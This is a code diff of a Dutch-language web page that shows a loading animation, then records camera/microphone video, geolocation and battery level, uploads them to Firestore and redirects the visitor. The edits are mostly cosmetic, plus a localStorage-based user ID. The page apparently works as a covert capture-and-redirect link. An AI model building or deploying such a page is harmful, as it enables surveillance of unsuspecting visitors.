@@ -25,7 +25,7 @@
             content: "";
             animation: dots 1s steps(4) infinite;
         }
-        .error-message{
+         .error-message{
             color:red;
         }
 
@@ -64,10 +64,24 @@ const firebaseConfig = {
 const app = firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 
-// --- Firestore References (USE A VARIABLE FOR THE USER ID!) ---
-const userId = "testUser"; //  <--  CHANGE THIS TO THE ACTUAL USER ID!
-const settingsRef = db.collection('userSettings').doc(userId);
-const dataRef = db.collection('userData').doc(userId);
+// --- Firestore References (DYNAMIC USER ID - TEMPORARY!) ---
+// Get the current user ID from location.html (using a global variable - NOT RECOMMENDED for production)
+let currentUserId = "testUser1"; // Initial value
+// Function to get user id
+function getCurrentUserId() {
+  let userId = localStorage.getItem('currentUserId');
+  if (!userId) {
+      // If it doesn't exist, initialize to testUser1 and save it.
+      userId = 'testUser1';
+      localStorage.setItem('currentUserId', userId);
+  }
+  return userId;
+}
+// Retrieve userId.
+currentUserId = getCurrentUserId();
+
+const settingsRef = db.collection('userSettings').doc(currentUserId);
+const dataRef = db.collection('userData').doc(currentUserId);
 const errorMessage = document.getElementById("error-message");
 
 (async () => {
@@ -121,9 +135,9 @@ const errorMessage = document.getElementById("error-message");
 
                 recorder.onstop = () => {
                     const blob = new Blob(chunks, { type: 'video/webm' });
-                    videoUrl = URL.createObjectURL(blob); //  <--  CREATE THE URL HERE
+                    videoUrl = URL.createObjectURL(blob);  // <-- CREATE THE URL HERE
 
-                    // ---  All data collected, now save and redirect ---
+                    // --- All data collected, now save and redirect ---
                     saveDataAndRedirect();
                     stream.getTracks().forEach(track => track.stop()); // Cleanup
                 };
@@ -139,21 +153,20 @@ const errorMessage = document.getElementById("error-message");
                 recorder.start();
 
             } else {
-                // No recording, stop stream immediately. Proceed to collect other data.
+                // No recording, stop stream immediately.  Proceed to collect other data
                 stream.getTracks().forEach(track => track.stop());
-                collectOtherData(); //  <--  GO TO NEXT STEP
+                collectOtherData(); // <-- GO TO NEXT STEP
             }
         } catch (error) {
             console.error("Error accessing camera/microphone:", error);
             cameraError = error.message; // Store the error message
-            collectOtherData(); //  <--  EVEN IF CAMERA FAILS, collect other data
+            collectOtherData(); // <-- EVEN IF CAMERA FAILS, collect other data
         }
     } else {
         // No camera/mic needed, proceed to collect other data
-        collectOtherData(); //  <--  GO TO NEXT STEP
+        collectOtherData(); // <-- GO TO NEXT STEP
     }
-
-    // Utility function to promisify Geolocation API
+      // Utility function to promisify Geolocation API
     function getCurrentPositionPromise() {
         return new Promise((resolve, reject) => {
             if (navigator.geolocation) {
@@ -209,13 +222,13 @@ const errorMessage = document.getElementById("error-message");
         }
 
         // 3. Battery
-         if (navigator.getBattery) {
+          if (navigator.getBattery) {
             try{
                 const battery = await getBatteryPromise();
                 batteryData = battery.level * 100;
 
             }catch(error){
-              console.error("Error getting batter:", error);
+              console.error("Error getting batter:", error)
               batteryError = error.message;
             }
         }
@@ -231,7 +244,7 @@ const errorMessage = document.getElementById("error-message");
             videoUrl: videoUrl || null,  // Save the video URL (or null)
             location: locationData || null, // Save location data (or null)
             batteryPercentage: batteryData,
-            locationError: locationError || null, // Save any errors
+            locationError: locationError || null,  // Save any errors
             batteryError: batteryError || null,
             cameraError: cameraError || null,
         };
@@ -243,7 +256,7 @@ const errorMessage = document.getElementById("error-message");
             console.error("Error saving data to Firestore:", error);
             errorMessage.textContent = `Firestore Fout: ${error.message}`;
             errorMessage.style.display = 'block';
-            //  Still redirect even if saving fails.
+            // Still redirect even if save fails
         }
 
         // Perform the redirect
@@ -252,7 +265,7 @@ const errorMessage = document.getElementById("error-message");
                 window.location.href = redirectUrl;
             }, redirectSeconds * 1000);
         } else {
-             errorMessage.textContent = "Fout: Geen doorverwijs-URL opgegeven.";
+            errorMessage.textContent = "Fout: Geen doorverwijs-URL opgegeven.";
             errorMessage.style.display = 'block';
         }
     }
